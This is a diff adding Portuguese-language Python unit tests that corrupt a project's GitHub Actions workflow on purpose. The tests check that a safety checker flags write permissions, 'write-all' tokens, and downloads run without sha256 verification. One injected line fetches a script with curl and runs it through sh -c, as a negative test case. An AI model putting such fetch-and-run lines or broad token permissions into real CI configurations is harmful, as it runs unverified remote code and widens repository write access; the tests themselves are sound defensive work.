@@ -80,6 +80,33 @@ class ProjetoDeExemplo(unittest.TestCase):
         escrever(ci, "".join(linha for linha in linhas if "sha256sum -c" not in linha))
         self.assertFalhaEm("test_nada_baixado_direto_para_uma_shell")
 
+    def estragar_o_ci(self, antes, depois):
+        ci = self.pasta / ".github" / "workflows" / "ci.yml"
+        texto = ci.read_text(encoding="utf-8")
+        self.assertIn(antes, texto)
+        escrever(ci, texto.replace(antes, depois, 1))
+
+    def test_permissao_de_escrita_num_job(self):
+        # O bloco do topo continua só de leitura; o job ganha escrita por baixo dele.
+        self.estragar_o_ci("    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions:\n      contents: write\n")
+        self.assertFalhaEm("test_o_token_so_le_e_o_checkout_nao_guarda_a_credencial")
+
+    def test_permissao_write_all(self):
+        self.estragar_o_ci("  segredos:\n", "  segredos:\n    permissions: write-all\n")
+        self.assertFalhaEm("test_o_token_so_le_e_o_checkout_nao_guarda_a_credencial")
+
+    def test_download_dentro_de_sh_c(self):
+        self.estragar_o_ci("          tar -xzf", '          sh -c "$(curl -sSfL https://exemplo.com/x)"\n          tar -xzf')
+        self.assertFalhaEm("test_nada_baixado_direto_para_uma_shell")
+
+    def test_download_com_redirecionamento_ou_output_sem_sha256(self):
+        for baixar in ("curl -sSfL https://exemplo.com/f.tar.gz > f.tar.gz",
+                       "curl -sSfL --output f.tar.gz https://exemplo.com/f.tar.gz"):
+            with self.subTest(baixar=baixar):
+                self.estragar_o_ci("          tar -xzf", f"          {baixar}\n          tar -xzf")
+                self.assertFalhaEm("test_nada_baixado_direto_para_uma_shell")
+                self.estragar_o_ci(f"          {baixar}\n", "")
+
     def test_juntar_changelog_em_rascunho_mostra_a_secao(self):
         escrever(self.pasta / "CHANGELOG.md", "# Changelog\n")
         escrever(self.pasta / "changelog.d" / "2026-11-01-primeira.md", "Categoria: Adicionado\n\n- Tudo novo.\n")
